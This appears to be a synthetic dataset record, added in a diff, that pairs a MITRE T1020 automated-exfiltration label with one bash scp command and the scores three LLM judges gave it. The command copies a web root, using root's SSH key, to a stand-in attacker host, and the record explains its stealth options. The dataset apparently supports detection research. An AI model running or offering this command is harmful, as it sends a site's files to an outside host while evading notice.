@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "scp -q -C -l 300 -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r /var/www/html attacker@198.51.100.10:/var/tmp/.cache/www_html >/dev/null 2>&1",
+  "explanation": "Recursively exfiltrates the web root using scp with compression and bandwidth throttling to minimize detection while operating non-interactively.",
+  "rationale_steps": [
+    "Use -r to recursively copy the target directory without creating local archives.",
+    "Enable -C to compress on-the-fly and -l to limit bandwidth for stealth.",
+    "Authenticate via SSH key and suppress host key prompts to run unattended.",
+    "Run in quiet mode and redirect output to avoid visible progress or logs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-a13b64e2",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The scp command uses valid flags (-q -C -l -i -P -o -r), proper redirection, and is well-formed with no quoting or parsing issues.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly performs recursive SSH-based exfiltration with compression, throttling, and non-interactive options, but relies on access to /root/.ssh/id_rsa and the existence of the remote parent directory, which may not be true.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:46:08.466325Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid scp flags, properly quoted paths, balanced options, and correct syntax for all arguments including -o key=value pairs.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely achieves automated exfiltration (T1020) by recursively transferring the web root to an external attacker-controlled host using scp with compression (-C), bandwidth throttling (-l 300) to evade detection, a specific identity key (-i), suppressed host key checking for non-interactive operation, and output redirection to /dev/null for stealth.",
+        "combined_score": 5.0,
+        "confidence": 0.97,
+        "timestamp": "2026-02-18T22:23:57.786015Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly formed with valid scp flags, correct SSH option syntax, and standard Bash redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements the technical components of T1020, including bandwidth throttling (-l), compression (-C), and non-interactive execution (StrictHostKeyChecking=no) for exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:24:03.582617Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
